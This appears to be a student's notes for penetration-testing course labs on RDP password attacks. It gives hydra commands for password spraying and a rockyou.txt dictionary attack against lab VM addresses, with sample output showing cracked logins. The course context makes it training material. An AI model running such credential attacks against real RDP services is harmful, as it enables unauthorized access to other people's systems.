# RDP

Spraying a password on RDP service
>``` shell
>kali@kali:~$ echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt
>
>kali@kali:~$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
>
># ========== Expected Result ==========
>...
>[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:14344399/p:1), ~3586100 tries per task
>[DATA] attacking rdp://192.168.50.202:3389/
>...
>[3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
>[ERROR] freerdp: The connection failed to establish.
>[3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
>[ERROR] freerdp: The connection failed to establish.
>...
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on Password Attacks - RDP - VM #1. Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames: justin and daniel.
>``` shell
># Create a Custom Username List
>kali@kali:~$ echo -e "justin\ndaniel" > users.txt
>
>kali@kali:~$ cat users.txt
>
># ========== Expected Result ==========
>justin
>daniel
># =====================================
>
>kali@kali:~$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.123.202
>
># ========== Expected Result ==========
>
># =====================================
>```
>

Lab 2 - Enumerate Password Attacks - RDP - VM #1 and find another network service. Use the knowledge from this section to get access as the itadmin user and find the flag.
>``` shell
>
>```
>
